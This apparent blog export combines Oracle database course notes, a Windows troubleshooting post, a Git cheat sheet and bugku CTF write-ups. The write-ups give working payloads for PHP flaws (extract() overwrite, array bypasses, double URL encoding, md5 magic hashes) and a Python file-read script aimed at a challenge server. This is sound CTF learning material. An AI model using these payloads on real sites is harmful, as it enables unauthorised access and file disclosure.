Jose研究室的研究员E.F.Codd首次提出了数据库系统的关系模型 关系数据结构：规范化的二维表 二维表（关系） 一个关系就是没有重复行和重复列的二维表，二维表的每一行在关系中称为元组，每一列在关系中称为属性。学生关系的每一行代表一个学生的记录，每一列代表学生记录的一个字段。属性个数（n）称为关系的元。 关系模型的组成 关系数据结构 单一的数据结构—-关系 现实世界的实体以及实体间的各种联系均用关系来表示 数据的逻辑结构—-二维表 从用户角度，关系模型中数据的逻辑结构是一张二维表。 关系操作集合 插入、删除、修改、查询（选择、投影、连接、除、并、交、差 关系完整性约束 实体完整性、参照完整性、域完整性、用户定义完整性 关系数据库就是一些相关的二维表和其他数据库对象的集合。 在这个定义中明确，关系数据库中的所有信息都存储在二维表格中；一个关系数据库可能包含多个表；除了这种二维表外，关系数据库还包含一些其他对象，如视图等。 概念 关系 是一张二维表，通常将一个无重复行、重复列的二维表看成一个关系，每个关系都有一个关系名。 元组 二维表的每一行在关系中称为元组。描述了现实世界中的一个实体或不同实体间的一种联系。 属性 二维表的每一列在关系中称为属性，每个属性都有一个属性名，各个属性的取值称为属性值。每个属性有一定的取值范围，称为值域。 域 （Domain） 关系中每个属性的值是有一定变化范围，每一个属性所对应的变化范围叫做属性的变域或简称域，它是属性值的集合，关系中所有属性的实际取值必须来自于它对应的域。 分量 一个元组在一个属性域上的取值称为该元组在此属性上的分量。 关系模式 二维表的表头那一行称为关系模式 关系模式，即一个关系的关系名及其全部属性名的集合。关系模式是概念模型中实体型及实体型之间联系的数据模型表示。 一般表示为：关系名（属性名1，属性名2 ，……，属性名n） 关系模式指出了一个关系的结构；而关系则是由满足关系模式结构的元组构成的集合。关系模式是稳定的、静态的，而关系则是随时间变化的、动态的。 候选码 若关系中的某一属性或属性组合的值能唯一地标识一个元组，则称该属性组为候选码 在最简单的情况下，候选码只包含一个属性。 在最极端的情况下，关系模式的所有属性组是这个关系模式的候选码，称为全码（All-key） 主码（主键）（Primary key） 若一个关系有多个候选码，则选定其中一个为主码（Primary key） 主码的各个属性称为主属性（Prime attribute） 不包含在任何侯选码中的属性称为非主属性（Non-key attribute） 外码（外键）(Foreign Key) 如果关系中某个属性或属性组合并非码，但却是另一个关系的主码，则称此属性或属性组合为本关系的外码或外键(Foreign Key)。在关系数据库中，用外码表示两个表间的联系。 基本特征 有坚实的理论基础 （关系代数） 几个元素组成的一个有序组称为一个元组，通常元组是用圆括号括起来的一些元素表示，元素间使用逗号分隔。 例如 (E001,钱达理,男,东风路78号)是元组的例子。 在关系数据库中，可以把一个表的每一行看作一个元组。 数据结构简单、易于理解 对用户提供了较全面的操作支持 得到了众多开发商的支持 1.5数据库系统结构概念模型的一种表示方法 数据库系统内部结构 从数据库管理系统角度看，数据库系统通常采用三级模式结构，是数据库系统内部的系统结构 数据库系统外部结构 从数据库最终用户角度看，数据库系统的结构分为:单用户结构；客户/服务器结构；浏览器／应用服务器／数据库服务器多层结构等。 数据库系统的三级模式结构 为了有效地组织、管理数据，提高数据库的逻辑独立性和物理独立性，人们为数据库设计了一个严谨的体系结构，数据库领域公认的标准结构是三级模式结构，即外模式、模式和内模式 。 根据各类人员与数据库的不同关系，可把视图分为三种 对应于用户的外部视图 对应于应用程序员的概念视图 对应于系统程序员的内部视图 模式（Schema，也称逻辑模式） 数据库中全体数据的逻辑结构和特征的描述 所有用户的公共数据视图，综合了所有用户的需求 一个数据库只有一个模式 模式的地位 ：是数据库系统模式结构的中间层 与数据的物理存储细节和硬件环境无关 与具体的应用程序、开发工具及高级程序设计语言无关 外模式 也称子模式或用户模式 数据库用户（包括应用程序员和最终用户）使用的局部数据的逻辑结构和特征的描述 数据库用户的数据视图，是与某一应用有关的数据的逻辑表示 外模式的地位：介于模式与应用之间 外模式与应用的关系： 同一外模式也可以为多个应用系统所使用 但一个应用程序只能使用一个外模式 模式与外模式的关系： 外模式通常是模式的子集 一个数据库可以有多个外模式。反映了不同的用户的应用需求、看待数据的方式、对数据保密的要求 内模式 是数据物理结构和存储方式的描述 是数据在数据库内部的表示方式 记录的存储方式（顺序存储，按照B树结构存储） 索引的组织方式 数据是否压缩存储 数据是否加密 一个数据库只有一个内模式 数据库的两级映像 三级模式是对数据的三个抽象级别 二级映象在DBMS内部实现这三个抽象层次的联系和转换 外模式\\模式映像 保证数据的逻辑独立性 同一个模式可以有任意多个外模式，外模式／模式映象，定义外模式与模式之间的对应关系； 当模式改变时，外模式／模式映象使外模式保持不变； 应用程序是依据数据的外模式编写的，从而不必修改应用程序，保证了数据与程序的逻辑独立性 模式／内模式映象 保证数据的物理独立性。 模式／内模式映象定义了数据全局逻辑结构 全局逻辑结构与存储结构 储结构之间的对应关系。 当数据库的存储结构改变了，模式／内模式映象使模式保持不变。 应用程序不受影响。保证了数据与程序的物理独立性 数据库系统外部结构 从数据库最终用户角度看（数据库系统外部的体系结构） ，数据库系统的结构分为: 单用户数据库系统 整个数据库系统(应用程序、DBMS、数据)装在一台计算机上，为一个用户独占，不同机器之间不能共享数据。 集中式结构 客户／服务器 浏览器／应用服务器／数据库服务器多层结构等 小结 数据管理的发展过程 数据库系统的组成 数据模型 数据模型的三要素 概念模型， E-R模型 三种主要数据模型 数据库系统结构 数据库系统三级模式结构 数据库系统两级映像系统结构","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"Oracle数据库第三周","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/第3周课/","text":"Oracle数据库第三周关系数据库简介 提出关系模型的是美国 提出关系模型的是美国IBM公司的 公司的E.F.Codd 1970年提出关系数据模型 年提出关系数据模型 E.F.Codd, “A Relational Model of Data for Large Shared Data Banks”, 《Communication of the ACM》1970 之后，提出了关系代数和关系演算的概念 1972年提出了关系的第一、第二、第三范式 1974年提出了关系的 年提出了关系的BC范式 关系数据库2.1关系数据结构及形式化定义2.1.1关系 单一的数据结构 单一的数据结构—-关系 现实世界的实体以及实体间的各种联系均用关系来表示逻辑结构—二维表 从用户角度，关系模型中数据的逻辑结构是一张二维表 建立在集合代数的基础上 补充 域 域是一组具有相同数据类型的值的集合 笛卡尔积 关系 2.1.2关系模式1. 什么是关系模式 关系模式（ 关系模式（Relation Schema）是型 关系是值的集合 关系模式是对关系的描述 元组集合的结构 属性构成性构成 属性来自的域 属性与域之间的映象关系 元组语义以及完整性约束条件 属性间的数据依赖关系集合 2. 定义关系模式关系模式可以形式化地表示为： 表示 含义 R 关系名 U 组成该关系的属性名集合 D 属性组U中属性所来自的域 DOM 属性向域的映像集合 F 属性间的数据依赖关系集合 3. 关系模式与关系 关系模式 对关系的描述 静态的、稳定的 关系 关系模式在某一时刻的状态或内容 动态的、随时间不断变化的 关系模式和关系通常统称为关系 一般通过上下文加以区别 2.1.3关系数据库 关系数据库 在一个给定的应用领域中，所有关系的集合构成一个关系数据库 关系数据库的型与值 关系数据库的型：关系数据库模式（对关系数据库的描述） 关系数据库模式包括 若干域的定义 在这些域上定义的若干关系模式 关系数据库的值：关系模式在某一时刻对应的关系的集合，简称为关系数据库 2.2关系操作2.2.1基本关系操作常用的关系操作 查询：选择、投影、连接、除、并、交、差 数据更新：插入、删除、修改 查询的表达能力是其中最主要的部分 选择、投影、并、差、笛卡尔积是5种基本操作 关系操作的特点 集合操作方式：操作的对象和结果都是集合 2.2.2 关系数据库语言的分类 关系代数语言 用对关系的运算来表达查询要求 代表：ISBL 关系演算语言：用谓词来表达查询要求 元组关系演算语言 谓词变元的基本对象是元组变量 代表：APLHA ，QUEL 域关系演算语言 谓词变元的基本对象是域变量 代表：QBE 具有关系代数和关系演算双重特点的语言 代表： SQL（Structured Query Language） 2.3 关系的完整性2.3.1关系的三类完整性约束 实体完整性和参照完整性： 关系模型必须满足的完整性约束条件称为关系的两个不变性应该由关系系统自动支持。 用户定义的完整性： 应用领域需要遵循的约束条件，体现了具体领域中的语义约束。 2.3.2 实体完整性 规则2.1 实体完整性规则（Entity Integrity） 若属性A是基本关系R的主属性，则属性A不能取空值 实体完整性规则的说明 (1) 实体完整性规则是针对基本关系而言的。 一个基本表通常对应现实世界的一个实体集。 (2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。 (3) 关系模型中以主码作为唯一性标识。 (4) 主码中的属性即主属性不能取空值。 主属性取空值，就说明存在某个不可标识的实体，即存在不可区分的实体，这与第（2）点相矛盾，因此这个规则称为实体完整性 关系代数关系代数中 集合运算符有：并（∪），差（－），交（∩），笛卡尔积（×） 专门的关系运算符有：选择（σ），投影（π），连接（▷◁），除（÷） 基本关系代数运算是：并（∪），差（－），笛卡尔积（×），投影（π），选择（σ）","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"数据库设计","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/第9周课/","text":"oracle数据库第九周课——数据库设计设计方法概述数据库设计定义：对于一个给定的应用环境，构造最优的数据库模式，建立数据库及应用系统，使之能有效地存储数据，满足各种用户的应用需求。 数据库设计的目标 能够满足数据存储需求 便于最终用户访问 具有良好的安全机制 数据准确并易于管理 数据库整体性能良好 数据库设计的特点 涉及多学科的综合技术 硬件、软件和干件的结合 庞大的工程项目 三分技术，七分管理与经验，十二分基础数据 涉及结构设计和行为设计二方面 典型的数据库设计方法 基于3NF的方法 ORACLE Barker方法 基于ER模型的方法 计算机辅助方法 ORACLE：DESIGNER 2000 SYBASE：POWERDESIGNER 1.基于3NF的数据库设计设计企业模式 研究应用环境，并设定环境中所使用的资料 决定每一个报表里各自包含的数据元素 决定数据与元素之间的关系，确定主关键字的数据元素和普通数据元素 对每一组数据元素推导第三范式关系 基于得到的第三范式关系给出数据库企业模式 2.ORACLE Barker方法包含七个阶段 制定策略 分析阶段 设计阶段 构建阶段 编写阶段 转换阶段 产品阶段 3.E-R方法E-R图所描述的模式叫企业模式 企业模式式面向问题的、概念性的模式，与DBMS无关，是高级概念模型 基于E-R方法数据库设计的一般步骤 需求分析 概念设计 逻辑设计 物理设计 实现设计 数据库系统开发7个阶段1.规划阶段2.需求分析目标 分析用户活动，产生业务流程图 确定系统范围，产生系统范围图 分析用户活动涉及的数据，产生数据流图 分析系统数据，产生数据字典 如何获得数据字典 需求收集和分析 1.信息要求 用户对即将建立的数据库有些什么要求？保存什么信息？要从数据库中得到什么信息？提供的数据与取得的信息是什么形式？等等 2.处理要求 如何使用数据？对各种数据的使用频率如何？检索方式如何？要输出那些表格？被存取的数据量与运行限制等 3.功能要求 对将要建立的信息系统应具有那些功能？能给组织解决那些处理问题？功能要求包括规划的、现存的、人工的或自动的等各方面。 4.环境特征 企业的规模与结构、部门的地理分布、现有系统资源、数据库的安全性、完整性限制以及ＤＢＭＳ与运行环境约束等 结果：数据字典（数据项、数据结构、数据流、数据存储和处理过程五个阶段） 3.概念设计","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"Windows专业版19013升级踩坑","date":"2019-11-12T16:00:00.000Z","path":"2019/11/13/Note/window专业版19013升级踩坑/","text":"Windows专业版19013升级踩坑前言傍晚正在写着作业，突然跳出window更新，毕竟选了慢推送,心想没什么可怕的，可事情永远不会那么简单！！！ 。。。。。。 第一坑问题:开机就报错，Windows资源管理器报错Inter Optane(tm) Memory Pinning无法加载DLL”iaStorAfsService.dll”:找不到指定模块。(异常来自于HRESULT:0x8007007E)。 右下角也不见了英特尔快速存储的程序图标 解决办法: 查看相关服务，没有启动，发现有新程序打开等等需要读写内存的情况下，就会报错。然后由于是DELL笔记本，就去DELL官网查询相关驱动程序，下载了Inter-Repaid-Storage-Technology-Driver-and-Managerment.exe，运行并尝试修复，但是不起作用 搜索后发现，inter官网有更好的修复工具， inter官网修复工具f6flpy.zip，下载压缩包后解压，运行，然后会提示重启，重启后不再提示错误，问题解决 原因分析：应该是该程序扩展丢失，造成程序和服务无法启动，修复工具将扩展装回，成功解决问题 第二坑问题：某socks软件报错由于权限等愿意绑定本地端口10808失败，导致流量无法通过程序。 解决： 管理员权限运行powershell，输入nestat -ano|findstr ”10808“无显示，没有程序占用端口。 程序换成10800端口仍然不行，再次查看端口占用还是没有程序占用 打开控制面板-&gt;windows Defender 防火墙-&gt;高级设置-&gt;添加UDP和TCP的入站规则，重启电脑，没有解决。可能是设置了开机运行的缘故 把开机运行关闭，重复第三步，等待系统完全启动再运行该软件，发现无问题，貌似成功解决 事情没这么简单，中午再次开机运行，三四步都尝试均失效，于是尝试其他软件能否绑定这个端口 发现其他软件都无法绑定这个端口，并显示报错，10808端口为系统预留端口，I/O堆栈错误 遂切换思路,其他软件可以绑定1080端口，那不如就将该软件绑定1080端口，切换端口，成功 分析：本应该早一点进入第七步，但是顾及该软件还需要占用一个10809端口用于http，以为只切换10808端口不能解决问题，忘记曾经查看该软件源码http要用的10809为socks绑定的端口号+1，浪费些许时间。 总结Windows的更新：新功能不知道有什么，bug倒是立马出现/doge","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"}]},{"title":"Git常用命令清单","date":"2019-11-02T16:00:00.000Z","path":"2019/11/03/Note/常用git命令清单/","text":"Git常用命令清单一、新建代码库12345678# 在当前目录新建一个Git代码库git init# 新建一个目录，将其初始化为Git代码库git init [project-name]# 下载一个项目和它的整个代码历史git clone [url] 二、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 1234567891011121314151617181920212223242526272829# 显示当前的Git配置git config --list# 编辑Git配置文件git config -e [--global]# 设置提交代码时的用户信息git config [--global] user.name &quot;[name]&quot;git config [--global] user.email &quot;[email address]&quot;#为git配置全局代理git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1080git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1080#取消代理git config --global --unset http.proxygit config --global --unset https.proxy#只对github.comgit config --global http.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080#取消代理git config --global --unset http.https:&#x2F;&#x2F;github.com.proxy#配置完代理后配置文件将出现下面类似字段[http] proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080[https] proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 三、增加/删除文件123456789101112131415161718192021# 添加指定文件到暂存区git add [file1] [file2] ...# 添加指定目录到暂存区，包括子目录git add [dir]# 添加当前目录的所有文件到暂存区git add .# 添加每个变化前，都会要求确认# 对于同一个文件的多处变化，可以实现分次提交git add -p# 删除工作区文件，并且将这次删除放入暂存区git rm [file1] [file2] ...# 停止追踪指定文件，但该文件会保留在工作区git rm --cached [file]# 改名文件，并且将这个改名放入暂存区git mv [file-original] [file-renamed] 四、代码提交123456789101112131415161718# 提交暂存区到仓库区git commit -m [message]# 提交暂存区的指定文件到仓库区git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区git commit -a# 提交时显示所有diff信息git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化git commit --amend [file1] [file2] ... 五、分支123456789101112131415161718192021222324252627282930313233343536373839404142# 列出所有本地分支git branch# 列出所有远程分支git branch -r# 列出所有本地分支和远程分支git branch -a# 新建一个分支，但依然停留在当前分支git branch [branch-name]# 新建一个分支，并切换到该分支git checkout -b [branch]# 新建一个分支，指向指定commitgit branch [branch] [commit]# 新建一个分支，与指定的远程分支建立追踪关系git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区git checkout [branch-name]# 切换到上一个分支git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支git merge [branch]# 选择一个commit，合并进当前分支git cherry-pick [commit]# 删除分支git branch -d [branch-name]# 删除远程分支git push origin --delete [branch-name]git branch -dr [remote&#x2F;branch] 六、标签1234567891011121314151617181920212223242526# 列出所有taggit tag# 新建一个tag在当前commitgit tag [tag]# 新建一个tag在指定commitgit tag [tag] [commit]# 删除本地taggit tag -d [tag]# 删除远程taggit push origin :refs&#x2F;tags&#x2F;[tagName]# 查看tag信息git show [tag]# 提交指定taggit push [remote] [tag]# 提交所有taggit push [remote] --tags# 新建一个分支，指向某个taggit checkout -b [branch] [tag] 七、查看信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# 显示有变更的文件git status# 显示当前分支的版本历史git log# 显示commit历史，以及每次commit发生变更的文件git log --stat# 搜索提交历史，根据关键词git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行git log [tag] HEAD --pretty&#x3D;format:%s# 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名git log --follow [file]git whatchanged [file]# 显示指定文件相关的每一次diffgit log -p [file]# 显示过去5次提交git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序git shortlog -sn# 显示指定文件是什么人在什么时间修改过git blame [file]# 显示暂存区和工作区的差异git diff# 显示暂存区和上一个commit的差异git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异git diff HEAD# 显示两次提交之间的差异git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;# 显示某次提交的元数据和内容变化git show [commit]# 显示某次提交发生变化的文件git show --name-only [commit]# 显示某次提交时，某个文件的内容git show [commit]:[filename]# 显示当前分支的最近几次提交git reflog 八、远程同步1234567891011121314151617181920212223# 下载远程仓库的所有变动git fetch [remote]# 显示所有远程仓库git remote -v# 显示某个远程仓库的信息git remote show [remote]# 增加一个新的远程仓库，并命名git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分支合并git pull [remote] [branch]# 上传本地指定分支到远程仓库git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突git push [remote] --force# 推送所有分支到远程仓库git push [remote] --all 九、撤销12345678910111213141516171819202122232425262728293031# 恢复暂存区的指定文件到工作区git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区git checkout [commit] [file]# 恢复暂存区的所有文件到工作区git checkout .# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变git reset [file]# 重置暂存区与工作区，与上一次commit保持一致git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支git revert [commit]# 暂时将未提交的变化移除，稍后再移入git stashgit stash pop 十、其他12# 生成一个可供发布的压缩包git archive","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"git","slug":"git","permalink":"https://yanmymickey.github.io/tags/git/"}]},{"title":"CTF_note","date":"2019-07-15T16:00:00.000Z","path":"2019/07/16/CTF/ctf总结/","text":"web1.题目hint很重要，再看html元素和js有无提示，根据网站操作演练一遍，发现页面回显和可疑之处。 2.看头和表单数据。 3.看robots.txt 4.扫查看是否有可疑之处。 5.常见漏洞总结： 1.文件包含漏洞 …/./进行跨目录 2.md5碰撞，base64加密，==判断传数组 3.cookies参数，seesionID保证数据不刷新 4.Refer和X-Forward要求本地 mirc1.文件隐写 1.文件包含，jpg包含zip，docx包含zip。注意查看document文件夹和目录下document文件。 2.文件头，gif，png，exif，jiff格式损坏复原。 3.文件尾数据可疑%url编码，大小写字母base编码，数字转换进制。 4.文件属性隐藏密码和数据。 5.mp3文件隐藏数据，密码如3.4.查询 6.二维码反转，图片过滤色差。 7.图片显示不全，一搬为png，更改宽度和高度一致 18.zip密码爆破 9.dd分离文件，参数说明:、 if inputfile 输入文件 of outputfile 输出文件 skip 跳过多少字节分离 ibs 读取文件速率 obs 输出文件速率","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"}]},{"title":"bugku_web11","date":"2019-07-15T16:00:00.000Z","path":"2019/07/16/CTF_WP/bugku_web11/","text":"bugku_web11题目地址：http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= 备注：我用的是python3 filename=a2V5cy50eHQ=文件包含 因为filename一般说明源代码中有读取打开文件的函数 从下面源码中可知的确含有函数file() base64格式大小写字母+=/ line=可能与读取行数有关 php函数isset()判断是非设置值 header url重定向 in_array 第一个是匹配字符，第二个是数组 file 读取文件每一行 尝试文件读取的步骤cookies 里面要有值 margin=margin filename =keys.php keys.php要base64加密a2V5cy5waHA= 获取的index.php的源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phperror_reporting(0);$file &#x3D; base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);$file_list &#x3D; array(&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,&#39;2&#39;&#x3D;&gt; &#39;keys.php&#39;); if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;$file_list[2]&#x3D;&#39;keys.php&#39;;&#125; if(in_array($file, $file_list))&#123;$fa &#x3D; file($file);echo $fa[$line];&#125;?&gt;import requestsfor a in range(0,100): index_url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(a)+&#39;&amp;filename&#x3D;aW5kZXgucGhw&#39; session &#x3D; requests.session() index &#x3D; session.get(index_url) if index.text!&#x3D;&quot;&quot;: print(index.text) else: break;for a in range(0,100): flag_url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#39;+str(a)+&#39;&amp;filename&#x3D;a2V5cy5waHA&#x3D;&#39; cook &#x3D; &#123; &#39;margin&#39;:&#39;margin&#39; &#125; flag &#x3D; session.get(flag_url,cookies&#x3D;cook) if flag.text!&#x3D;&quot;&quot;: print(flag.text) else: break key=’KEY{key_keys}解题步骤总结1.乱码试着解码2.url中的filename尝试文件包含3.编写脚本4.代码审计5.cookie满足要求6.继续脚本发送获取key题目所需基础知识php基础语法,函数看不懂可以查,不急python基础语法,函数看不懂可以查,不急requests库基本操作了解一下说明是cookies和sessionhttp的response和request，head工具解码网站：某个大佬的博客 https://www.wishingstarmoye.com/","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"bugku代码审计","date":"2019-07-15T16:00:00.000Z","path":"2019/07/16/CTF_WP/弱类型类别漏洞小结和bugku代码审计小结/","text":"bugku代码审计写在前面一下只是个人的一点拙见，请大佬轻喷，欢迎大佬补充，很多不恰当的地方。 0x00 extract变量覆盖题目地址题目源码12345678910111213&lt;?php$flag&#x3D;&#39;xxx&#39;;extract($_GET);if(isset($shiyan))&#123; $content&#x3D;trim(file_get_contents($flag)); if($shiyan&#x3D;&#x3D;$content)&#123; echo&#39;flag&#123;xxx&#125;&#39;; &#125; else&#123; echo&#39;Oh.no&#39;; &#125;&#125;?&gt; writeip 构造payload: http://123.206.87.240:9009/1.php?shjyan=&amp;flag= 覆盖原有的flag变量，是空==空成立，输出flag flagflag{bugku-dmsj-p2sm3N} extract用法(PHP 4, PHP 5, PHP 7) extract — 从数组中将变量导入到当前的符号表 说明1extract ( array &amp;$array [, int $flags &#x3D; EXTR_OVERWRITE [, string $prefix &#x3D; NULL ]] ) : int 本函数用来将变量从数组中导入到当前的符号表中。 检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。 参数 array 一个关联数组。此函数会将键名当作变量名，值作为变量的值。对每个键／值对都会在当前的符号表中建立变量，并受到 flags和prefix参数的影响。必须使用关联数组，数字索引的数组将不会产生结果，除非用了EXTR_PREFIX_ALL或者EXTR_PREFIX_INVALID。 flags 对待非法／数字和冲突的键名的方法将根据取出标记flags参数决定。可以是以下值之一： 参数 说明 EXTR_OVERWRITE 如果有冲突，覆盖已有的变量。 EXTR_SKIP 如果有冲突，不覆盖已有的变量。 EXTR_PREFIX_SAME 如果有冲突，在变量名前加上前缀 prefix。 EXTR_PREFIX_ALL 给所有变量名加上前缀prefix。 EXTR_PREFIX_INVALID 仅在非法／数字的变量名前加上前缀 prefix。 EXTR_IF_EXISTS 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。举个例子，以下情况非常有用：定义一些有效变量，然后从 $_REQUEST 中仅导入这些已定义的变量。 EXTR_PREFIX_IF_EXISTS 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 EXTR_REFS 将变量作为引用提取。这有力地表明了导入的变量仍然引用了array 参数的值。可以单独使用这个标志或者在flags 中用 OR 与其它任何标志结合使用。 备注 如果没有指定 flags，则被假定为 EXTR_OVERWRITE。 prefix 注意 ： prefix仅在flags的值是EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID或 EXTR_PREFIX_IF_EXISTS时需要。 如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。 返回值 返回成功导入到符号表中的变量数目。 0x01strcmp比较字符串题目地址题目源码12345678910&lt;?php$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#39;a&#39;])) &#123; if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 &#x2F;&#x2F;比较两个字符串（区分大小写） die(&#39;Flag: &#39;.$flag); else print &#39;No&#39;;&#125;?&gt; writeup 用数组绕过，构造payload: http://123.206.87.240:9009/6.php?a[]=1 flagflag{bugku_dmsj_912k} 0x02urldecode二次编码绕过题目地址题目源码123456789101112&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;not allowed!&quot;); exit();&#125;$_GET[id] &#x3D; urldecode($_GET[id]);if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)&#123; echo &quot;Access granted!&quot;; echo &quot;flag&quot;;&#125;?&gt; writeup 浏览器会对get参数进行一次URL编码，源码中还有一次，两次编码绕过验证。 对hackerDJ两次URL编码构造payload: http://123.206.87.240:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 flagflag{bugku__daimasj-1t2} 0x03md5()函数题目地址题目源码123456789101112&lt;?phperror_reporting(0);$flag &#x3D; &#39;flag&#123;test&#125;&#39;;if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123; if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;]) print &#39;Your password can not be your username.&#39;; else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;])) die(&#39;Flag: &#39;.$flag); else print &#39;Invalid password&#39;;&#125;?&gt; writeup (md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]))判断是全等于，所以不可以用碰撞，可以用数组绕过。 构造payload： http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2 flagflag{bugk1u-ad8-3dsa-2} 0x04md5加密相等绕过题目地址题目源码123456789101112131415&lt;?php$md51 &#x3D; md5(&#39;QNKCDZO&#39;);$a &#x3D; @$_GET[&#39;a&#39;];$md52 &#x3D; @md5($a);if(isset($a))&#123; if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123; echo &quot;flag&#123;*&#125;&quot;; &#125; else &#123; echo &quot;false!!!&quot;; &#125;&#125;else&#123; echo &quot;please input a&quot;;&#125;?&gt; writeup $md51 == $md52不是全等于，用md5碰撞 构造payload： http://123.206.87.240:9009/13.php?a=240610708 flagflag{bugku-dmsj-am9ls} md5碰撞样例1234567891011121314151617181920212223242526QNKCDZO0e8304004519934940580242199033912406107080e462097431906509019562988736854s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e509367213418206700842008763514 0x05数组返回NULL绕过题目地址题目源码1234567891011&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;password&#39;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE) echo &#39;You password must be alphanumeric&#39;; else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE) die(&#39;Flag: &#39; . $flag); else echo &#39;Invalid password&#39;;&#125;?&gt; writeup 题目提示很明显 数组构造payload： http://123.206.87.240:9009/19.php?password[]=1 